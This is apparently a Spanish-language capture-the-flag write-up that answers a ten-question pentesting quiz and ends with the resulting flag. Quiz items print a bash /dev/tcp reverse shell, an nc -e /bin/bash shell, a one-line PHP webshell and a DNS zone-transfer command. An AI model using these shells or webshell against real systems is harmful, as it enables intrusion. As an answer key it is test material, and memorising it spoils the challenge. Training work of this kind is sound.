Consistía en resolver este test:
1. ¿Cuál de estas shells reversas funciona en Kali si estamos en escucha por el puerto tcp 5555  
	- a. nc localhost 5555  
	- b. nc -u 127.0.0.1 5555 -e /bin/bash
	- c. bash - c "bash -i >& /dev/tcp/127.0.0.1/5555 0>&1"  
	- d. Todas las anteriores

2.  ¿Qué código PHP sirve para ejecutar comandos en una webshell con el parámetro cmd?  
	- a. `<?php system($_GET['cmd']); ?>`
	- b. `<?php system($cmd); ?>`
	- c. `<?php $_GET['cmd'](); ?>`  
	- d. Ninguna de las anteriores

3. ¿Qué comando te monta un servidor web local en el puerto 6666 de la carpeta en la que estás?  
	- a. python3 -m SimpleHTTPServer 6666  
	- b. python3 -m http.server 6666  
	- c. nc -nvlp 6666 .  
	- d. Ninguno

4.  ¿Qué opción de nmap permite escanear puertos SCTP?  
	- a. -sY  
	- b. -sT  
	- c. -sU  
	- d. Los puertos SCTP no existen

5.  ¿Qué parametro se utiliza para usar una clave pública (id_rsa) en el login de un ssh?  
	- a. ssh -i id_rsa user@ip 
	- b. ssh -p id_rsa user@ip  
	- c. ssh -k id_rsa user@ip  
	- d. ssh -oHostKeyAlgorithms=id_rsa user@ip

6.  ¿Qué comando codificado 'ls' es válido para ejecutar en un powershell (powershell -enc XXXXXX)  
	- a. ls
	- b. bABzAAoA  
	- c. bHM= 	
	- d. En powershell no funciona ls

7. ¿Qué comando de los siguientes se usa para realizar una transferencia de zona de un DNS?  
	- a. dig zonetransfer.me TXT  
	- b. dig @nsztm2.digi.ninja zonetransfer.me trzn  
	- c. dig zonetransfer.me NS  
	- d. dig @nsztm2.digi.ninja zonetransfer.me axfr

8. bf 51 75 e9 20 70 72 65 67 75 6e 74 61 20 65 73 20 65 73 74 61 3f  
	- a. 1  
	- b. 8  
	- c. 31  
	- d. 38

9. Juegan blancas y hacen mate en X movimientos: 
	- a. 13
	- b. 15
	- c. 21
	- d. 23 

![](../Imágenes/Pasted%20image%2020241106232816.png)



10. ¿Cuál de estas flags está puesta para engañar a propósito? 
	- a.cibergal{cadababada}  
	- b.cibergal{aaaaaaaaab}  
	- c.cibergal{abcdabcdab}  
	- d.cibergal{abacadabaa}

La mayoría de preguntas son de conocimientos pero algunas peculiares:
6 https://stackoverflow.com/questions/53269099/powershell- base64-encoding-required

```bash
iconv -f ASCII -t UTF-16LE ls |base64 -w 0
```

Escribiendo ls en un fichero y usando el comando:

![](../Imágenes/Pasted%20image%2020241106233039.png)

8 Está en hexadecimal, 
```bash
echo "bf 51 75 e9 20 70 72 65 67 75 6e 74 61 20 65 73 20 65 73 74 61 3f" | tr - d ' '  | base16 - d  
�Qu� pregunta es esta?  
```
La respuesta es la d porque 8 en hexadecimal es: 

```bash
echo -n "8" | base16                 
38
```

9 Hay webs que te encuentran los movimientos que deben hacer

10 Inspeccionando el html se ve una pista fake:

![](../Imágenes/Pasted%20image%2020241106233704.png)

En resumen: 

cibergal{cabaabddcd}